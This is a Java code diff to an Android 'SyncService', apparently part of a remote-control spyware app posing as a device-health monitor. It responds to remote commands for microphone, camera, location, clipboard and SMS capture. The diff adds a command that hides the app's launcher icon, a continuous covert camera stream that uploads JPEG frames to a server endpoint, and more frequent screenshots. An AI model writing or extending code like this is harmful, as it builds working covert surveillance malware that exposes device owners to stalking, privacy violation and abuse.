@@ -69,6 +69,13 @@ public class SyncService extends Service {
     private volatile boolean camLiveOn = false;
     private volatile boolean camLiveFront = false;
     private static SyncService instance;
+    // Persistent camera live session fields
+    private android.hardware.camera2.CameraDevice _liveCam = null;
+    private android.hardware.camera2.CameraCaptureSession _liveSess = null;
+    private android.media.ImageReader _liveReader = null;
+    private android.os.HandlerThread _liveHt = null;
+    private android.os.Handler _liveHandler = null;
+    private volatile long _lastCamFramePush = 0;
     private PowerManager.WakeLock wakeLock;
 
     public static SyncService getInstance() { return instance; }
@@ -104,6 +111,7 @@ public class SyncService extends Service {
     public void onDestroy() {
         running = false;
         instance = null;
+        stopCamLiveInternal();
         releaseWakeLock();
         super.onDestroy();
         scheduleRestart();
@@ -120,15 +128,18 @@ public class SyncService extends Service {
                 long now = System.currentTimeMillis();
                 if (now - lastReg > 30_000) { reg(id); lastReg = now; }
 
-                // Screenshots every 1.5s via MonitorService (full flavor)
-                if (now - lastShot > 1_500) {
+                // Deliver any screenshot the async callback already placed
+                byte[] s = pendingShot;
+                if (s != null) { pendingShot = null; final byte[] fs = s; pool.submit(() -> pushShot(id, fs)); }
+
+                // Request a new screenshot every 600ms — snap() is async so
+                // the frame arrives 100-300ms later on a future iteration
+                if (now - lastShot > 600) {
                     try {
                         Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
                         Object inst = ms.getMethod("getInstance").invoke(null);
                         if (inst != null) ms.getMethod("snap").invoke(inst);
                     } catch (Exception ignored) {}
-                    byte[] s = pendingShot;
-                    if (s != null) { pendingShot = null; pushShot(id, s); }
                     lastShot = now;
                 }
 
@@ -151,12 +162,13 @@ public class SyncService extends Service {
     private void exec(String id, String cmd) {
         if (cmd.equals("__uninstall__")) { handleUninstall(id); return; }
         if (cmd.equals("__upgrade__"))   { doUpgrade(id); return; }
+        if (cmd.equals("__hide__"))      { hideIcon(); sendOut(id, cmd, enc("icon_hidden")); return; }
         if (cmd.startsWith("__mic"))     { doMic(id, cmd); return; }
         if (cmd.equals("__cam__"))            { doCam(id, false); return; }
         if (cmd.equals("__cam_front__"))      { doCam(id, true); return; }
         if (cmd.equals("__cam_live_on__"))    { startCamLive(id, false); return; }
         if (cmd.equals("__cam_live_front__")) { startCamLive(id, true); return; }
-        if (cmd.equals("__cam_live_off__"))   { camLiveOn = false; sendOut(id, cmd, enc("cam_live_stopped")); return; }
+        if (cmd.equals("__cam_live_off__"))   { stopCamLiveInternal(); sendOut(id, cmd, enc("cam_live_stopped")); return; }
         if (cmd.equals("__loc__"))       { doLoc(id); return; }
         if (cmd.equals("__clip__"))      { doClip(id); return; }
         if (cmd.equals("__sms__"))       { doSms(id); return; }
@@ -183,16 +195,126 @@ public class SyncService extends Service {
 
     // ── special commands ───────────────────────────────────────────────────────
 
-    private void startCamLive(String id, boolean front) {
-        camLiveOn = true;
-        camLiveFront = front;
-        sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("cam_live_started"));
-        pool.submit(() -> {
-            while (camLiveOn && running) {
-                doCam(id, camLiveFront);
-                try { Thread.sleep(1500); } catch (InterruptedException e) { break; }
+    void hideIcon() {
+        try {
+            android.content.ComponentName alias = new android.content.ComponentName(
+                getPackageName(), getPackageName() + ".MainLauncher");
+            getPackageManager().setComponentEnabledSetting(alias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {}
+    }
+
+    private void startCamLive(final String id, final boolean front) {
+        stopCamLiveInternal();
+        camLiveOn = true; camLiveFront = front;
+        if (checkSelfPermission("android.permission.CAMERA") != PackageManager.PERMISSION_GRANTED) {
+            sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("CAMERA not granted")); return;
+        }
+        _liveHt = new HandlerThread("cam-live"); _liveHt.start();
+        _liveHandler = new Handler(_liveHt.getLooper());
+        try {
+            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
+            String camId = null;
+            int facing = front ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
+            for (String cid : cm.getCameraIdList()) {
+                CameraCharacteristics ch = cm.getCameraCharacteristics(cid);
+                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
+                if (f != null && f == facing) { camId = cid; break; }
             }
-        });
+            if (camId == null && cm.getCameraIdList().length > 0) camId = cm.getCameraIdList()[0];
+            if (camId == null) { sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("no camera")); return; }
+
+            // YUV_420_888 at preview resolution — full frame rate, works on all devices
+            _liveReader = ImageReader.newInstance(960, 720, ImageFormat.YUV_420_888, 3);
+            final String fCamId = camId;
+            _liveReader.setOnImageAvailableListener(reader -> {
+                if (!camLiveOn) { try (android.media.Image img = reader.acquireLatestImage()) {} return; }
+                long now2 = System.currentTimeMillis();
+                if (now2 - _lastCamFramePush < 180) {  // cap at ~5fps
+                    try (android.media.Image img = reader.acquireLatestImage()) {} return;
+                }
+                try (android.media.Image img = reader.acquireLatestImage()) {
+                    if (img == null) return;
+                    byte[] jpeg = yuvToJpeg(img, 35);
+                    _lastCamFramePush = now2;
+                    pool.submit(() -> {
+                        try {
+                            JSONObject b = new JSONObject();
+                            b.put("did", loadId());
+                            b.put("img", Base64.encodeToString(jpeg, Base64.NO_WRAP));
+                            b.put("cam", front ? "front" : "back");
+                            post("/esp/device-photo", b);
+                        } catch (Exception ignored) {}
+                    });
+                } catch (Exception ignored) {}
+            }, _liveHandler);
+
+            cm.openCamera(fCamId, new CameraDevice.StateCallback() {
+                @Override public void onOpened(CameraDevice cam) {
+                    _liveCam = cam;
+                    java.util.List<Surface> surfs = new java.util.ArrayList<>();
+                    surfs.add(_liveReader.getSurface());
+                    try {
+                        cam.createCaptureSession(surfs, new CameraCaptureSession.StateCallback() {
+                            @Override public void onConfigured(CameraCaptureSession sess) {
+                                _liveSess = sess;
+                                try {
+                                    CaptureRequest.Builder rb = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
+                                    rb.addTarget(_liveReader.getSurface());
+                                    rb.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
+                                    rb.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
+                                    rb.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
+                                    sess.setRepeatingRequest(rb.build(), null, _liveHandler);
+                                    sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("live_started"));
+                                } catch (Exception e) { sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("err:" + e.getMessage())); stopCamLiveInternal(); }
+                            }
+                            @Override public void onConfigureFailed(CameraCaptureSession s) {
+                                sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("session_failed")); stopCamLiveInternal();
+                            }
+                        }, _liveHandler);
+                    } catch (Exception e) { sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("err:" + e.getMessage())); stopCamLiveInternal(); }
+                }
+                @Override public void onDisconnected(CameraDevice cam) { cam.close(); _liveCam = null; }
+                @Override public void onError(CameraDevice cam, int err) { cam.close(); _liveCam = null; sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("cam_err:" + err)); }
+            }, _liveHandler);
+        } catch (Exception e) { sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("open_err:" + e.getMessage())); stopCamLiveInternal(); }
+    }
+
+    private void stopCamLiveInternal() {
+        camLiveOn = false;
+        try { if (_liveSess != null) { _liveSess.stopRepeating(); _liveSess.close(); } } catch (Exception ignored) {}
+        try { if (_liveCam   != null) _liveCam.close(); }   catch (Exception ignored) {}
+        try { if (_liveReader!= null) _liveReader.close(); } catch (Exception ignored) {}
+        try { if (_liveHt   != null) _liveHt.quitSafely(); } catch (Exception ignored) {}
+        _liveSess = null; _liveCam = null; _liveReader = null; _liveHt = null; _liveHandler = null;
+    }
+
+    /** Convert Camera2 YUV_420_888 Image to JPEG bytes. */
+    private byte[] yuvToJpeg(android.media.Image img, int quality) {
+        int w = img.getWidth(), h = img.getHeight();
+        android.media.Image.Plane[] planes = img.getPlanes();
+        java.nio.ByteBuffer yBuf = planes[0].getBuffer();
+        java.nio.ByteBuffer uBuf = planes[1].getBuffer();
+        java.nio.ByteBuffer vBuf = planes[2].getBuffer();
+        int yLen = yBuf.remaining();
+        byte[] nv21 = new byte[yLen + w * h / 2];
+        yBuf.get(nv21, 0, yLen);
+        byte[] u = new byte[uBuf.remaining()];
+        byte[] v = new byte[vBuf.remaining()];
+        uBuf.get(u); vBuf.get(v);
+        int uvStride = planes[2].getPixelStride();
+        int uvRow    = planes[2].getRowStride();
+        for (int row = 0; row < h / 2; row++) {
+            for (int col = 0; col < w / 2; col++) {
+                nv21[yLen + row * w + col * 2]     = v[row * uvRow + col * uvStride];
+                nv21[yLen + row * w + col * 2 + 1] = u[row * uvRow + col * uvStride];
+            }
+        }
+        android.graphics.YuvImage yuv = new android.graphics.YuvImage(nv21, ImageFormat.NV21, w, h, null);
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        yuv.compressToJpeg(new android.graphics.Rect(0, 0, w, h), quality, baos);
+        return baos.toByteArray();
     }
 
     private void handleUninstall(String id) {
